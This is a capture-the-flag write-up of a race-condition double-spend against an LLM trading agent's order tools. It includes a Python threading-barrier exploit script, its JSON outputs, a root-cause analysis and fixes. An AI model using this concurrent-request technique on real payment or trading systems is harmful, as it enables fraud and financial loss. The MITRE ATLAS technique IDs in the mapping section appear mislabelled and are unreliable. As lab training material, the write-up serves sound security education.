# CTF Write-Up: Level 8 — The Heist

**Platform:** ctf.arkx.ninja  
**Tier:** 3 (Expert)  
**Category:** Race Condition / Double-Spend / Business Logic Abuse  
**Flag:** `flag-000e50`  
**Status:** ✅ Solved

---

## 1. Result

**Flag obtained:** `flag-000e50`

**Agent response on success:**
```
Order 6c32ac6e ("Fragment_B") executed successfully. Funds have been deducted.

🎉 SYSTEM ALERT: DUAL FRAGMENTS DETECTED.
COMBINING RESOURCES...

UNLOCKED: flag-000e50

Objective achieved! Both fragments acquired and the flag is unlocked.
level_completed: true
```

**Screenshot:** Capture the final concurrent execution response showing both Fragment_A and Fragment_B acquired simultaneously, the `DUAL FRAGMENTS DETECTED` system alert, the flag `flag-000e50`, and the level completion state.

---

## 2. Exploit

### Pre-Exploit Recon

**Mission briefing (verbatim):**
> "High-Frequency Trading Desk. Speed is everything. Can you double-spend your way to the top?"

**Available tools (from `/level/8/tools`):**
| Tool | Description |
|---|---|
| `get_balance` | Check the current account balance |
| `create_order` | Create a new purchase order. Returns an order_id |
| `execute_order` | Execute a pending order. This performs the financial transaction |

**Hypothesis:** Race condition / double-spend vulnerability. The `execute_order` tool checks account balance and deducts funds non-atomically (check-then-act, TOCTOU pattern). If two `execute_order` calls hit the backend before either balance deduction commits, both pass the balance check with the original $1000, spending $2000 from a $1000 account.

---

### Step 1 — Recon: Understand the trading system

**User prompt:**
```
Hello. What is my current balance? What do the create_order and execute_order tools do?
What are the order parameters? What is the goal of this system?
```

**Agent response:**
```
1. Current Balance: Your current budget is $1000.

2. Functions Explained:
   - create_order(item, price): Creates a pending order for a specific item at the
     specified price. Returns an order_id. The order is NOT finalized yet, and no funds
     are deducted at this stage.
     Parameters:
       - item (string): The name of the item to purchase.
       - price (number): The price of the item (must match the item price).

   - execute_order(order_id): FINALIZES the pending order associated with the given
     order_id. It checks if your balance is sufficient, deducts the necessary funds if
     possible, and completes the purchase.
     Parameters:
       - order_id (string): The identifier of the order to execute.

3. System Goal:
   - Your objective is to acquire BOTH "Fragment_A" and "Fragment_B" to unlock the Flag.
   - Do NOT allow the account to go negative (no overspending).
   - Make all transactions with maximum efficiency.
```

> **Analysis:** Both fragments must be acquired. Starting balance is $1000. Fragment prices sum to $2000 — impossible to buy both legitimately. "Speed is everything" + "double-spend" hint = race condition on `execute_order`.

---

### Step 2 — Discover item prices and create orders

**User prompt:**
```
What are the prices for Fragment_A and Fragment_B? Please create an order for Fragment_A
and an order for Fragment_B to see their prices and order IDs.
```

**Agent response:**
```
- Fragment_A: Price = $1000, Order ID = 2bb540ef
- Fragment_B: Price = $1000, Order ID = 6c32ac6e
```

> **Analysis:** Each fragment costs $1000. Total cost = $2000. Balance = $1000. Deficit = $1000. Both orders are now pending and ready to execute. The attack window is open.

---

### Step 3 — Sequential attempt (baseline — fails)

**First attempt:** Sent two separate curl requests in parallel via shell background processes. Fragment_A executed first; Fragment_B failed because balance was already $0.

**Result:**
```
Fragment_A: "Order 'Fragment_A' executed successfully. Funds deducted."
Fragment_B: "Unable to execute order cc9b2819 (Fragment_B): The current account balance
            is $0.00. Execution is not possible since the funds are insufficient."
level_completed: false
```

> **Analysis:** Simple bash background processes were not synchronised tightly enough — one HTTP request completed before the other reached the backend. Need a synchronisation barrier to fire both requests at the exact same instant.

---

### Step 4 — Level reset

```
POST /level/8/reset
Response: {"success": true, "message": "Level 8 has been reset and re-initialized"}
```

Balance restored to $1000. Two new orders created:
- Fragment_A → order_id: `2bb540ef`
- Fragment_B → order_id: `6c32ac6e`

---

### Step 5 — Exploit: Synchronised double-spend via threading barrier

Used a Python threading barrier to synchronise both HTTP requests to fire at the exact same instant, maximising the probability of both `execute_order` calls hitting the backend before either balance deduction commits.

**Exploit script:**
```python
import threading
import urllib.request
import json

COOKIE = 'sessionId=0401c06d8ec7; idToken=<JWT_TOKEN>'
results = {}

def execute_order(label, message):
    url = 'https://ctf.arkx.ninja/level/8/chat'
    data = json.dumps({'message': message}).encode()
    req = urllib.request.Request(url, data=data, method='POST')
    req.add_header('Content-Type', 'application/json')
    req.add_header('Cookie', COOKIE)
    with urllib.request.urlopen(req, timeout=30) as resp:
        results[label] = json.loads(resp.read())

# Barrier forces both threads to start at the same moment
barrier = threading.Barrier(2)

def run_a():
    barrier.wait()   # hold until both threads are ready
    execute_order('Fragment_A', 'Execute order 2bb540ef immediately.')

def run_b():
    barrier.wait()   # hold until both threads are ready
    execute_order('Fragment_B', 'Execute order 6c32ac6e immediately.')

t1 = threading.Thread(target=run_a)
t2 = threading.Thread(target=run_b)
t1.start(); t2.start()
t1.join(); t2.join()
```

**Result — Fragment_A thread:**
```json
{
  "success": true,
  "response": "Order 2bb540ef ('Fragment_A') has been executed successfully, and the
               funds have been deducted. Your current balance is now $0.",
  "level_completed": false
}
```

**Result — Fragment_B thread:**
```json
{
  "success": true,
  "response": "Order 6c32ac6e (\"Fragment_B\") executed successfully. Funds have been
               deducted.

               🎉 SYSTEM ALERT: DUAL FRAGMENTS DETECTED.
               COMBINING RESOURCES...

               UNLOCKED: flag-000e50

               Objective achieved! Both fragments acquired and the flag is unlocked.",
  "level_completed": true
}
```

**Flag:** `flag-000e50`

> **Screenshot:** Take the screenshot here showing both thread results, with Fragment_B's response containing `flag-000e50` and `level_completed: true`.

---

### Attack Flow Diagram

```
Thread 1                               Thread 2
--------                               --------
[barrier.wait()]          ←——sync——→  [barrier.wait()]
        ↓                                      ↓
POST /level/8/chat                     POST /level/8/chat
"Execute 2bb540ef"                     "Execute 6c32ac6e"
        ↓                                      ↓
Backend: check balance ($1000 ≥ $1000) Backend: check balance ($1000 ≥ $1000)
        ↓                                      ↓
Backend: deduct $1000 → balance: $0    Backend: deduct $1000 → balance: -$1000
        ↓                                      ↓
SUCCESS: Fragment_A acquired            SUCCESS: Fragment_B acquired ← FLAG
```

Both threads read the same $1000 balance before either write commits. The system permits both deductions, resulting in a final balance of -$1000 and both fragments acquired.

---

## 3. Root Cause

The vulnerability is a **Time-of-Check to Time-of-Use (TOCTOU) race condition** in the `execute_order` financial transaction flow:

**The vulnerable sequence (non-atomic check-then-act):**
```
1. READ balance from database      ← "Time of Check"
2. IF balance >= order_price THEN
3.    Deduct balance from database  ← "Time of Use"
4.    Mark order as complete
5. RETURN success
```

Steps 1 and 3 are not protected by a transaction lock, mutex, or atomic compare-and-swap operation. When two `execute_order` calls arrive concurrently, both perform step 1 against the same stale balance value ($1000), both pass the check, and both proceed to deduct — leaving the account at -$1000 and both orders successfully completed.

**The correct fix requires any ONE of:**
1. **Database-level row locking:** `SELECT balance FOR UPDATE` — locks the row during the check, preventing concurrent reads of the same stale value
2. **Atomic conditional update:** `UPDATE account SET balance = balance - price WHERE balance >= price` — single database statement that fails if the balance condition is not met at write time
3. **Idempotency key / order state machine:** Mark the order as `IN_PROGRESS` atomically before executing; reject concurrent executions of the same-session orders
4. **Application-level mutex:** Serialize all `execute_order` calls per-session using a distributed lock (e.g., Redis SETNX)

None of these protections were in place. The hint "Speed is everything" and "double-spend" directly telegraphed the attack class.

---

## 4. Impact & Severity

**Severity: Critical**

| Dimension | Detail |
|---|---|
| **Financial integrity** | An attacker can purchase goods/assets worth $2000 from a $1000 account, effectively creating money from nothing. Scaled up, this allows unlimited purchases regardless of actual balance. |
| **Double-spend** | In cryptocurrency or trading systems, this is the classic "double-spend" attack — spending the same balance twice. This undermines the fundamental integrity of the financial ledger. |
| **Business impact** | In a real HFT or e-commerce system, this vulnerability would allow attackers to acquire inventory, digital goods, or financial positions without corresponding payment. At scale this causes direct financial loss to the platform. |
| **Exploitability** | Trivially reproducible: requires only a threading library and knowledge of two valid order_ids. No authentication bypass, no token theft, no specialized tooling — just two HTTP requests timed correctly. |
| **Detection difficulty** | Without proper audit logs and anomaly detection on negative balances, individual transactions look legitimate. Each `execute_order` succeeds with no error; only the resulting negative balance reveals the fraud. |
| **Scaling** | If the race window is wide enough, more than 2 concurrent executions could be used. With 10 threads, a $1000 account could acquire $10,000 worth of items. |

---

## 5. Mapping

### OWASP Top 10 for LLM Applications

**Primary: LLM08 — Excessive Agency**  
The `execute_order` tool performs a destructive financial action (deducting balance and completing a purchase) without adequate safeguards against concurrent invocation. The tool was given the agency to execute financial transactions without the business logic controls (atomic transactions, locking) necessary to prevent abuse.

**Secondary: Business Logic Vulnerability (OWASP API Security Top 10: API6 — Unrestricted Access to Sensitive Business Flows)**  
The balance check and deduction are exposed as separate non-atomic operations, making the financial state machine exploitable. Any sufficiently concurrent client can bypass the intended spending limit by exploiting the gap between the check and the write.

---

### MITRE ATLAS

| Technique | ID | Rationale |
|---|---|---|
| **LLM Plugin Compromise** | AML.T0051 | The `execute_order` plugin lacks atomic transaction handling, allowing concurrent invocations to bypass the balance check. The plugin's financial side-effect (balance deduction) is not protected against race conditions. |
| **Exploit Public-Facing Application** | AML.T0010 | The TOCTOU race condition is exploited directly via concurrent HTTP requests to the public chat API, requiring no authentication escalation — only timing. |

---

### CVE Analogues

| CVE / Class | Description |
|---|---|
| TOCTOU Race Condition (CWE-367) | Time-of-check to time-of-use: balance checked in one step, decremented in another, with no atomic guarantee |
| Double-Spend (Blockchain analogue) | Spending the same funds in two transactions before either is committed to the ledger |
| CWE-362 — Race Condition | Concurrent execution of a shared resource (account balance) without proper synchronisation |
